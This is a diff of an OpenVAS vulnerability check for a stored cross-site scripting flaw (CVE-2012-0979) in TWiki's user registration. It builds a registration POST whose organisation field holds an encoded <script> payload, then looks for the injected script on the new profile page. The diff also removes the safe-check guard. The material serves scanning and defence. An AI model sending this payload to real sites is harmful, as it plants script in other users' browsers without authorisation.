@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_twiki_organization_xss_vuln.nasl 5839 2017-04-03 10:43:34Z cfi $
+# $Id: gb_twiki_organization_xss_vuln.nasl 11430 2018-09-17 10:16:03Z cfischer $
 #
 # TWiki 'organization' Cross-Site Scripting Vulnerability
 #
@@ -29,15 +29,15 @@ CPE = "cpe:/a:twiki:twiki";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802391");
-  script_version("$Revision: 5839 $");
+  script_version("$Revision: 11430 $");
   script_bugtraq_id(51731);
   script_cve_id("CVE-2012-0979");
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-04-03 12:43:34 +0200 (Mon, 03 Apr 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 12:16:03 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-03-20 12:04:55 +0530 (Tue, 20 Mar 2012)");
   script_name("TWiki 'organization' Cross-Site Scripting Vulnerability");
-  script_category(ACT_ATTACK);
+  script_category(ACT_DESTRUCTIVE_ATTACK); # Stored XSS
   script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
   script_family("Web application abuses");
   script_dependencies("gb_twiki_detect.nasl");
@@ -46,15 +46,13 @@ if(description)
 
   script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert
   arbitrary HTML and script code, which will be executed in a user's browser
-  session in the context of an affected site.
-
-  Impact Level: Application");
+  session in the context of an affected site.");
   script_tag(name:"affected", value:"TWiki version 5.1.1 and prior");
   script_tag(name:"insight", value:"The flaw is due to an improper validation of user-supplied input
   to the 'organization' field when registering or editing a user, which allows attackers to execute
   arbitrary HTML and script code in a user's browser session in the context of an affected site.");
-  script_tag(name:"solution", value:"No solution or patch was made available for at least one year
-  since disclosure of this vulnerability. Likely none will be provided anymore. General solution
+  script_tag(name:"solution", value:"No known solution was made available for at least one year
+  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
   options are to upgrade to a newer release, disable respective features, remove the product or
   replace the product by another one.");
   script_tag(name:"summary", value:"The host is running TWiki and is prone to cross site scripting
@@ -72,28 +70,20 @@ if(description)
   exit(0);
 }
 
-
 include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
-
-## Stored XSS (Not a safe check)
-if(safe_checks()){
-  exit(0);
-}
 
 if( ! twikiPort = get_app_port( cpe:CPE ) ) exit( 0 );
 if( ! dir = get_app_location( cpe:CPE, port:twikiPort ) ) exit( 0 );
 
 if( dir == "/" ) dir = "";
 
-## Get Host name
+useragent = get_http_user_agent();
 host = http_host_name(port:twikiPort);
 
-## Construct the Attack Request
 url = dir + "/register/Main/WebHome";
 
-## Construct the POST data
 postdata = "crypttoken=ad240d2a0504042701980e88c85bbc33&Twk1FirstName=ccc&Twk1" +
            "LastName=ccc&Twk1WikiName=CccCcc&Twk1Email=ccc%40ccc.com&Twk0"      +
            "Password=ccc&Twk0Confirm=ccc&Twk0OrganisationName=%3Cscript%3E"     +
@@ -101,20 +91,16 @@ postdata = "crypttoken=ad240d2a0504042701980e88c85bbc33&Twk1FirstName=ccc&Twk1" 
            "&Twk1Country=Belize&Twk0Comment=&rx=%25BLACKLISTPLUGIN%7B+action"   +
            "%3D%22magic%22+%7D%25&topic=TWikiRegistration&action=register";
 
-## Construct the POST request
 req = string("POST ", url, " HTTP/1.1\r\n",
              "Host: ", host, "\r\n",
-             "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
+             "User-Agent: ", useragent, "\r\n",
              "Content-Type: application/x-www-form-urlencoded\r\n",
              "Content-Length: ", strlen(postdata), "\r\n",
              "\r\n", postdata);
-
-## Send XSS attack
 res = http_keepalive_send_recv(port:twikiPort, data:req);
 
 if (res)
 {
-  ##Confirm the Attack by opening the registered profile
   url = dir + "/view/Main/CccCcc";
 
   if(http_vuln_check(port:twikiPort, url:url, pattern:"<script>alert" +
